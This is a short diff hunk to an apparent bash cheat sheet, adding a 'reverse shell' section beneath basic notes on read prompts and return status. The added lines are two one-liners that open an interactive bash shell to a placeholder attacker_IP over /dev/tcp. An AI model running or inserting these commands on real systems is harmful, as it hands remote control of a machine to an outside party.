@@ -327,6 +327,10 @@ read -sp 'prompt_here: ' variable_name_here
 
 # exit status (0 = succes, else failure)
 return some_value_here
+
+# reverse shell
+bash -i >& /dev/tcp/attacker_IP/port_here 0>&1
+0<&111;exec 111<>/dev/tcp/attacker_IP/port_here; bash <&111 >&111 2>&111
 ```
 
 
